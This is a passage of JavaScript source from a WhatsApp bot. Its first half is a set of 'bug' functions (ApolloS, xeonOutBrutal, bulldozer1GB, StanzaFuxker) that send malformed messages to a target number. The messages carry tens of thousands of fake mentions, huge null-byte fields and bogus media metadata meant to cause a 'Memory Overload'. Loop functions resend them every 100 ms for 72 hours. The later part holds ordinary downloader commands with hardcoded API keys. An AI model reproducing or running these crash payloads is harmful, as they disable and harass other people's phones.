    await XeonBotInc.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "Telegram: @MOTU_PATALU_HINDU_HAI" + xeonIpong,
            url: "https://youtube.com/@MR_MOTU_PATLUBY"
        }
    }, { participant: { jid: target } });
}
//==============================================================\\
async function execDelay(target, durationHours = 72) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (count < 5) {
        await delay(target),
        console.log(chalk.yellow(`MOTU PATLU BUG 🐞ACTIVE ${count + 1}/5 target> ${target}`));
        count++;
      } else {
        console.log(chalk.green(`[✓] Success Send Bug 5 Messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 5 0 Messages"));
      }
      await new Promise(resolve => setTimeout(resolve, 100));
    } catch (error) {
      console.error(` ${error.message}`);
      await new Promise(resolve => setTimeout(resolve, 100));
    }
  }

  console.log(`Stopped after running for 3 days. Total messages sent in last batch: ${count}`);
}

async function systemui(target, durationHours = 72) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (count < 5) {
        await NotifKill(target),
        console.log(chalk.yellow(`MOTU PATLU BUG 🐞ACTIVE ${count + 1}/5 target> ${target}`));
        count++;
      } else {
        console.log(chalk.green(`[✓] Success Send Bug 5 Messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 5 0 Messages"));
      }
      await new Promise(resolve => setTimeout(resolve, 100));
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      await new Promise(resolve => setTimeout(resolve, 100));
    }
  }

  console.log(`Stopped after running for 3 days. Total messages sent in last batch: ${count}`);
}

async function hindu(target, durationHours = 72) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (count < 5) {
        await LocationFlowX1(target),
        console.log(chalk.yellow(`MOTU PATLU BUG 🐞ACTIVE ${count + 1}/5 target> ${target}`));
        count++;
      } else {
        console.log(chalk.green(`[✓] Success Send Bug 5 Messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 5 0 Messages"));
      }
      await new Promise(resolve => setTimeout(resolve, 100));
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      await new Promise(resolve => setTimeout(resolve, 100));
    }
  }

  console.log(`Stopped after running for 3 days. Total messages sent in last batch: ${count}`);
}
//==============================================================\\
async function ApolloS(target) {
try {
let message = {
ephemeralMessage: {
message: {
interactiveMessage: {
header: {
title: "𝗜𝗡𝗗𝗜𝗔 👑",
hasMediaAttachment: false,
locationMessage: {
degreesLatitude: -6666666666,
degreesLongitude: 6666666666,
name: "𝐂𝐫𝐚𝐬𝐡",
address: "",
},
},
body: {
text: "🇮🇳",
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
},
contextInfo: {
participant: target,
mentionedJid: [
"0@s.whatsapp.net",
...Array.from(
{
length: 30000,
},
() =>
"1" +
Math.floor(Math.random() * 5000000) +
"@s.whatsapp.net"
),
],
},
},
},
},
};

await XeonBotInc.relayMessage(target, message, {
messageId: null,
participant: { jid: target },
userJid: target,
});
} catch (err) {
console.log(err);
    }
  }
//==============================================================\\
async function xeonOutBrutal(target) {
  let xeonOrWhat = JSON.stringify({
    status: true,
    criador: "Telegram: @MOTU_PATALU_HINDU_HAI",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] },
        _eventsCount: 800000,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["Array"],
          browser: ["Array"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 60000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnsockCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: false,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true
        }
      }
    }
  });

  let xeonyfuck = JSON.stringify({
    status: true,
    criador: "Telegram: @MOTU_PATALU_HINDU_HAI",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] },
        _eventsCount: 800000,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["Array"],
          browser: ["Array"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 60000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnsockCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: false,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true
        }
      }
    }
  });

  let xeonOutBrutal = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
          },
          body: {
            title: "Telegram: @MOTU_PATALU_HINDU_HAI",
            text: "Telegram: @MOTU_PATALU_HINDU_HAI",
            description: "Telegram: @MOTU_PATALU_HINDU_HAI",
            footer: "Telegram: @MOTU_PATALU_HINDU_HAI",
          },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select", buttonParamsJson: xeonOrWhat + "Telegram: @MOTU_PATALU_HINDU_HAI" },
              { name: "view_product", buttonParamsJson: xeonOrWhat + "Telegram: @MOTU_PATALU_HINDU_HAI" },
              { name: "payment_method", buttonParamsJson: xeonOrWhat + "Telegram: @MOTU_PATALU_HINDU_HAI" },
              { name: "call_permission_request", buttonParamsJson: xeonyfuck + "\u0003" },
              { name: "mpm", buttonParamsJson: xeonyfuck + "Telegram: @MOTU_PATALU_HINDU_HAI" },
              { name: "payment_info", buttonParamsJson: xeonyfuck + "Telegram: @MOTU_PATALU_HINDU_HAI" },
            ],
          },
        },
      },
    },
  };

  await XeonBotInc.relayMessage(target, xeonOutBrutal, {
    participant: { jid: target },
  });
}
//==============================================================\\
async function bulldozer1GB(target) {
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = "image/webp";
  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true",
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath:
            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: jid,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1000 * 40,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent( jid, message, {});

  await XeonBotInc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
//==============================================================\\
async function StanzaFuxker(target, ptcp = true) {
  const virtex = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Telegram: @MOTU_PATALU_HINDU_HAI" + "".repeat(16999), 
          listType: 2,
          singleSelectReply: {
            selectedRowId: "",
          },
          contextInfo: {
            virtexId: XeonBotInc.generateMessageTag(),
            participant: "13135550002@s.whatsapp.net",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://example.com/largefile",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999", // Large file size
                  pageCount: 1316134911,  // Max page count to slow down memory
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "Telegram: @Am_itachiuchiha" + "".repeat(97770),
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: "",
                },
                hasMediaAttachment: true,
                contentText: 'Telegram: @MOTU_PATALU_HINDU_HAI',
                footerText: "Telegram: @MOTU_PATALU_HINDU_HAI",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(170000),
                    buttonText: {
                      displayText: "Telegram: @MOTU_PATALU_HINDU_HAI" + "".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "Telegram: @MOTU_PATALU_HINDU_HAI" + "".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "Telegram: @MOTU_PATALU_HINDU_HAI" + "".repeat(1999),
                    },
                    type: 1,
                  },
                ],
                viewOnce: true,
                headerType: 3,
              },
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "Telegram: @MOTU_PATALU_HINDU_HAI",
            entryPointConversionApp: "Telegram: @MOTU_PATALU_HINDU_HAI",
            actionLink: {
              url: "t.me/MOTU_PATALU_HINDU_HAI",
              buttonTitle: "Telegram: @MOTU_PATALU_HINDU_HAI",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "Telegram: @MOTU_PATALU_HINDU_HAI",
            parentGroupJid: "Telegram: @MOTU_PATALU_HINDU_HAI",
            trustBannerType: "Telegram: @MOTU_PATALU_HINDU_HAI",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {},
          },
          description: "".repeat(29999),
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  let sections = [];
  for (let i = 0; i < 40; i++) {  
    let largeText = "\u0000".repeat(11999);  
    let deepNested = {
      title: `Section ${i + 1}`,
      highlight_label: `Highlight ${i + 1}`,
      rows: [
        {
          title: largeText,
          id: `\u0000`.repeat(999),
          subrows: [
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
              subsubrows: [
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
              ],
            },
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
            },
          ],
        },
      ],
    };
    sections.push(deepNested);
  }

  let listMessage = {
    title: "".repeat(70000),
    sections: sections,
  };

  let msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
            },
            body: proto.Message.InteractiveMessage.Body.create({
              text: 'Telegram: @MOTU_PATALU_HINDU_HAI' + "".repeat(29999),
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              buttonParamsJson: JSON.stringify(listMessage),
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              buttonParamsJson: JSON.stringify(listMessage),
              subtitle: "zhee crash" + "\u0000".repeat(9999),
              hasMediaAttachment: false,
            }),
            nativeFlowMessage:
              proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              }),
          }),
        },
      },
    }),
    { userJid: target }
  );
  
  await XeonBotInc.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });

  console.log(`Payload sent to ${target} - Overload complete`);

  await XeonBotInc.relayMessage(target, messagePayload, {
    additionalNodes: virtex,
    participant: { jid: target },
  });
  
  console.log(`Message sent to ${target} - Memory Overload`);
}
//==============================================================\\
if (m.message) {

    // Log the message details
    console.log(
        chalk.black(chalk.bgWhite('[ MESSAGE ]')),
        chalk.black(chalk.bgGreen(new Date())),
        chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' +
        chalk.magenta('=> FROM'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' +
        chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', from)
    );
}
//==============================================================\\

switch(command) {
/*case 'xjxjxjxoke': {
	let audiobuffy = fs.readFileSync(`./oke.mp3`)
	XeonBotInc.sendMessage('919863235489@s.whatsapp.net', { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true })     
	}
	break*/
	
	case 'reactch': {
    if (!q) {
        return replygcxeon(`Usage: ${prefix}reactch link_channel text\nFor example: ${prefix+command} https://whatsapp.com/channel/0029VaDnY2y0rGiPV41aSX0l hello`);}
    if (!q.startsWith("https://whatsapp.com/channel/")) {
        return replygcxeon("Link invalid!");}
    const xeonReaction = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒' };
    const emojiInput = args.slice(1).join(' ').toLowerCase();
    const emoji = emojiInput.split('').map(c => {
        if (c === ' ') return '―';
        return xeonReaction[c] || c;
    }).join('');
    try {
        const link = args[0];
        const channelId = link.split('/')[4];
        const messageId = link.split('/')[5];
        const res = await XeonBotInc.newsletterMetadata("invite", channelId);
        await XeonBotInc.newsletterReactMessage(res.id, messageId, emoji);
        return replygcxeon(`Sent reaction *${emoji}* for the message in the channel *${res.name}.*`);
    } catch (e) {
        console.error(e);
        return replygcxeon("Failed to send reaction. Please make sure the link and emoji are valid.");
    }}
break;
	
	case 'hdvid': {
    const fetch = require('node-fetch');
    const FormData = require('form-data');
    const q = m.quoted ? m.quoted : m;
    const mimetype = (q.msg || q).mimetype || q.mediaType || '';

    // Cek apakah file yang di-reply adalah video yang valid
    if (!/video/.test(mimetype)) {
        await XeonBotInc.sendMessage(m.chat, {
            text: '❌ uplod video on whatsapp than rely *hdvid*.',
            key: m.key
        });
        return;
    }

    await XeonBotInc.sendMessage(m.chat, {
        react: { text: '🕒', key: m.key }
    });

    try {
        // Cek apakah media ada dan bisa diunduh
        const media = await q.download?.();
        if (!media) {
            return kxz.sendMessage(m.chat, {
                text: '❌ chutiya ek video dal whatsapp par rely *hdvid*',
                key: m.key
            });
        }

        // Unggah video ke Catbox
        const form = new FormData();
        let ext = mimetype.split('/')[1] || '';
        if (ext) ext = `.${ext}`;
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', media, `file${ext}`);

        const res = await fetch('https://catbox.moe/user/api.php', {
            method: 'POST',
            body: form
        });

        const result = await res.text();
        const catboxUrl = result.trim();

        // Menggunakan URL Catbox untuk API AlyaChan untuk peningkatan kualitas video
        const apiUrl = `https://api.alyachan.dev/api/remini-video?video=${encodeURIComponent(catboxUrl)}&apikey=84wBCV`;
        
        const apiResponse = await fetch(apiUrl);
        const apiData = await apiResponse.json();

        if (apiData.status) {
            // Kirim video hasil peningkatan kualitas
            await XeonBotInc.sendMessage(m.chat, {
                video: { url: apiData.data.url },
                caption: '🎥  BOT MAD IN MOTU PATLU HD!'
            });
        } else {
            await XeonBotInc.sendMessage(m.chat, {
                text: '❌ INDIA API 🚩.',
                key: m.key
            });
        }

    } catch (e) {
        console.error(e);
        await XeonBotInc.sendMessage(m.chat, {
            text: `[ ! ] Gagal mengunggah video. Error: ${e.message}`,
            key: m.key
        });
    }
      }
      break;
            case 'ghiblihd': {
    const fetch = require('node-fetch');
    const FormData = require('form-data');
    const q = m.quoted ? m.quoted : m;
    const mimetype = (q.msg || q).mimetype || q.mediaType || '';

    // Cek apakah file yang di-reply adalah gambar yang valid
    if (!/image/.test(mimetype)) {
        await XeonBotInc.sendMessage(m.chat, {
            text: '❌ MAD BY MOTU PATLU  *ghibli*.',
            key: m.key
        });
        return;
    }

    await XeonBotInc.sendMessage(m.chat, {
        react: { text: '🕒', key: m.key }
    });

    try {
        // Cek apakah media ada dan bisa diunduh
        const media = await q.download?.();
        if (!media) {
            return kxz.sendMessage(m.chat, {
                text: '❌ ERRO *ghibli*',
                key: m.key
            });
        }

        // Unggah gambar ke Catbox
        const form = new FormData();
        let ext = mimetype.split('/')[1] || '';
        if (ext) ext = `.${ext}`;
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', media, `file${ext}`);

        const res = await fetch('https://catbox.moe/user/api.php', {
            method: 'POST',
            body: form
        });

        const result = await res.text();
        const catboxUrl = result.trim();

        // Setelah mendapatkan URL dari Catbox, kirim ke API Ghibli
        const ghibliRes = await fetch(`https://api.siputzx.my.id/api/image2ghibli?image=${encodeURIComponent(catboxUrl)}`);
        const ghibliUrl = ghibliRes.url;

        // Proses gambar HD menggunakan API yang ada pada case sebelumnya
        const hdRes = await fetch(`https://api.neoxr.eu/api/remini?image=${encodeURIComponent(ghibliUrl)}&apikey=L1jhlK`);
        const hdResJson = await hdRes.json();
        const hdImageUrl = hdResJson.data.url;

        // Kirim gambar HD ke chat
        await XeonBotInc.sendMessage(m.chat, {
            image: { url: hdImageUrl }, // kirim gambar hasil HD
            caption: '🎥 MAD BY MOTU PATLU BOT HD!'
        });
    } catch (e) {
        console.error(e);
        await XeonBotInc.sendMessage(m.chat, {
            text: `[ ! ] इंडिय 🕉🚩🇮🇳: ${e.message}`,
            key: m.key
        });
    }
}
break
case "mp4": {
  if (!text) return replyerror(`Masukkan link video!\nContoh:\n• *.ytmp4 https://youtube.com/shorts/BucRtQGow5k?si=MNeQUUlYz6eIugfg*\n• *.ytmp4 https://youtube.com/shorts/BucRtQGow5k?si=MNeQUUlYz6eIugfg*`);

  const isNeoxrDirect = text.startsWith("https://s.neoxr.eu/tunnel");
  const isYoutube = text.includes("youtube.com") || text.includes("youtu.be");

  try {
    if (isNeoxrDirect) {
      // ✅ Kirim langsung sebagai video agar bisa langsung diputar
      await XeonBotInc.sendMessage(m.chat, {
        video: { url: text },
        mimetype: 'video/mp4',
        caption: "🎥 Video berhasil dikirim, langsung bisa diputar!",
        fileName: "video_convert.mp4"
      }, { quoted: m });

    } else if (isYoutube) {
      const encoded = encodeURIComponent(text.trim());
      const res = await fetch(`https://api.neoxr.eu/api/youtube?url=${encoded}&type=video&quality=360p&apikey=L1jhlK`);
      const json = await res.json();

      if (!json.status || !json.data?.url) return replyb("MAD IN MOTU PATLU YouTube!");

      const { title, views, data } = json;

      await XeonBotInc.sendMessage(m.chat, {
        video: { url: data.url },
        mimetype: 'video/mp4',
        caption: `🎬 *${title}*\n👁️ ${views}`,
        fileName: data.filename
      }, { quoted: m });

    } else {
      return replygcxeon("⚠️ Link tidak valid! Masukkan link YouTube atau link tunnel Neoxr.");
    }

  } catch (err) {
    console.error(err);
    return replygcxeon("❌ MAD BY MOTU PATLU video.");
  }
  break;
}
    
    case 'ytmp3': {
  if (!text || !text.includes("youtube.com") && !text.includes("youtu.be"))
    return replyb(`🔗 Kirim link YouTube yang valid!\nContoh:\n*.ytmp3 https://youtube.com/shorts/BucRtQGow5k?si=MNeQUUlYz6eIugfg*`);

  try {
    const axios = require('axios');
    const fs = require('fs');
    const { execSync } = require('child_process');
    const path = require('path');

    await XeonBotInc.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

    // Ambil data dari Neoxr API
    const apiUrl = `https://api.neoxr.eu/api/youtube?url=${encodeURIComponent(text)}&type=audio&quality=128kbps&apikey=L1jhlK`;
    const res = await axios.get(apiUrl);
    const result = res.data;

    if (!result.status || !result.data?.url) {
      return replyb('❌ MOTU PATLU YouTube!');
    }

    const { title, channel, fduration, publish, thumbnail, id } = result;
    const audioUrl = result.data.url;
    const filename = result.data.filename || `${title}.mp3`;
    const safeName = filename.replace(/[^\w\s-]/gi, '_').substring(0, 50) + '.mp3';

    // Buat path sementara
    const tempIn = path.join(__dirname, 'raw_' + Date.now() + '.mp3');
    const tempOut = path.join(__dirname, 'final_' + Date.now() + '.mp3');

    // Download audio mentah
    const downloadMp3 = async (url, outputPath) => {
      const res = await axios.get(url, { responseType: 'arraybuffer' });
      fs.writeFileSync(outputPath, Buffer.from(res.data));
    };

    // Convert supaya bisa diputar di WA
    const convertToPlayable = (inputPath, outputPath) => {
      execSync(`ffmpeg -i "${inputPath}" -codec:a libmp3lame -b:a 128k "${outputPath}"`);
    };

    await downloadMp3(audioUrl, tempIn);
    convertToPlayable(tempIn, tempOut);

    // Kirim ke WA
    await XeonBotInc.sendMessage(m.chat, {
      audio: fs.readFileSync(tempOut),
      mimetype: 'audio/mpeg',
      fileName: safeName,
      ptt: false,
      contextInfo: {
        externalAdReply: {
          title: title,
          body: '🎵 YTMP3 Converter',
          thumbnailUrl: thumbnail,
          mediaType: 2,
          sourceUrl: `https://www.youtube.com/watch?v=${id}`
        }
      }
    }, { quoted: m });

    await XeonBotInc.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    // Hapus file sementara
    fs.unlinkSync(tempIn);
    fs.unlinkSync(tempOut);

  } catch (err) {
    console.error(err);
    return replyb(`❌ Error  proses:\n${err.message}`);
  }

  break;
}        
     
 case "ytmp4": {
  if (!text) return replygcxeon(`Masukkan link video!\nContoh:\n• *.ytmp4 https://www.youtube.com/watch?v=xxxx*\n• *.ytmp4 https://s.neoxr.eu/tunnel?token=xxx&key=yyy*`);

  const isNeoxrDirect = text.startsWith("https://s.neoxr.eu/tunnel");
  const isYoutube = text.includes("youtube.com") || text.includes("youtu.be");

  try {
    if (isNeoxrDirect) {
      // ✅ Kirim langsung sebagai video agar bisa langsung diputar
      await XeonBotInc.sendMessage(m.chat, {
        video: { url: text },
        mimetype: 'video/mp4',
        caption: "🎥 Video berhasil dikirim, langsung bisa diputar!",
        fileName: "video_convert.mp4"
      }, { quoted: m });

    } else if (isYoutube) {
      const encoded = encodeURIComponent(text.trim());
      const res = await fetch(`https://api.neoxr.eu/api/youtube?url=${encoded}&type=video&quality=720p&apikey=L1jhlK`);
      const json = await res.json();

      if (!json.status || !json.data?.url) return replyb("Gagal mengunduh video dari YouTube!");

      const { title, views, data } = json;

      await XeonBotInc.sendMessage(m.chat, {
        video: { url: data.url },
        mimetype: 'video/mp4',
        caption: `🎬 *${title}*\n👁️ ${views}`,
        fileName: data.filename
      }, { quoted: m });

    } else {
      return replygcxeon("⚠️ Link tidak valid! Masukkan link YouTube atau link tunnel Neoxr.");
    }

  } catch (err) {
    console.error(err);
    return replygcxeon("❌ Terjadi kesalahan saat mengirim video.");
  }

  break;
}

case 'ytmp377': {
  if (!text || (!text.includes("youtube.com") && !text.includes("youtu.be")))
    return replyb(`🔗 Kirim link YouTube yang valid!\nContoh:\n*.ytmp3 https://youtube.com/watch?v=abc123*`);

  try {
    const axios = require('axios');

    await XeonBotInc.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

    // Ambil data dari Neoxr API
    const apiUrl = `https://api.neoxr.eu/api/youtube?url=${encodeURIComponent(text)}&type=audio&quality=128kbps&apikey=L1jhlK`;
    const res = await axios.get(apiUrl);
    const result = res.data;

    if (!result.status || !result.data?.url)
      return replyb('❌ Gagal mengambil data audio dari YouTube!');

    const { title, channel, fduration, publish, thumbnail, id } = result;
    const audioUrl = result.data.url;
    const filename = result.data.filename || `${title}.mp3`;
    const safeName = filename.replace(/[^\w\s-]/gi, '_').substring(0, 50) + '.mp3';

    // Unduh audio sebagai buffer
    const audioBuffer = await axios.get(audioUrl, {
      responseType: 'arraybuffer',
      headers: {
        'User-Agent': 'Mozilla/5.0'
      }
    });

    // Kirim audio agar bisa langsung diputar
    await XeonBotInc.sendMessage(m.chat, {
  audio: Buffer.from(audioBuffer.data),
  mimetype: 'audio/mpeg',
  ptt: false,
  fileName: safeName, // <- pastikan fileName dikirim
  contextInfo: {
    externalAdReply: {
      showAdAttribution: true,
      title: title,
      body: `🎧 YTMP3 • ${channel}`,
      mediaType: 2,
      thumbnailUrl: thumbnail,
      sourceUrl: `https://www.youtube.com/watch?v=${id}`
    }
  }
}, { quoted: m });

    await XeonBotInc.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

  } catch (err) {
    console.error(err);
    return replyb(`❌ Terjadi error:\n${err.message}`);
  }

  break;
}        
        
case 'ytmp343': {
  if (!text || !text.includes("youtube.com")) return replyb(`🔗 Kirim link YouTube yang valid!\nContoh:\n*.ytmp3 https://youtube.com/watch?v=abc123*`);

  try {
    const axios = require('axios');
    const fs = require('fs');
    const path = require('path');

    await XeonBotInc.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

    const apiUrl = `https://api.neoxr.eu/api/youtube?url=${encodeURIComponent(text)}&type=audio&quality=128kbps&apikey=L1jhlK`;
    const res = await axios.get(apiUrl);
    const result = res.data;

    if (!result.status || !result.data?.url) {
      return replyb('❌ Gagal mengambil data audio dari YouTube!');
    }

    const { title, channel, fduration, publish, thumbnail, id } = result;
    const audioUrl = result.data.url;
    const filename = result.data.filename || `${title}.mp3`;
    const safeName = filename.replace(/[^\w\s-]/gi, '_').substring(0, 50) + '.mp3';
    const audioBuffer = await axios.get(audioUrl, {
      responseType: 'arraybuffer',
      headers: { 'User-Agent': 'Mozilla/5.0' }
    });

    // Kirim audio agar bisa langsung diputar
    await XeonBotInc.sendMessage(m.chat, {
      audio: Buffer.from(audioBuffer.data),
      mimetype: 'audio/mpeg',
      ptt: false,
      fileName: safeName,
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: title,
          body: `YTMP3 • Neoxr API`,
          mediaType: 2,
          thumbnailUrl: thumbnail,
          sourceUrl: `https://www.youtube.com/watch?v=${id}`
        }
      }
    }, { quoted: m });

    await XeonBotInc.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

  } catch (err) {
    console.error(err);
    return replyb(`❌ Error:\n${err.message}`);
  }

  break;
}

	case 'ig': {
  if (!text || !text.includes('instagram.com')) {
    return replygcxeon(`🔗  link Instagram yvalid!\nContoh:\n*.igvideo https://www.instagram.com/reel/...*`)
  }

  try {
    await XeonBotInc.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    const axios = require('axios')
    const res = await axios.get(`https://api.neoxr.eu/api/ig?url=${encodeURIComponent(text)}&apikey=L1jhlK`)
    const result = res.data

    if (!result.status || !Array.isArray(result.data)) {
      return replyb('❌ PLZ GIVE LINK INSTAGRAM📷!')
    }

    const video = result.data.find(v => v.type === 'mp4')
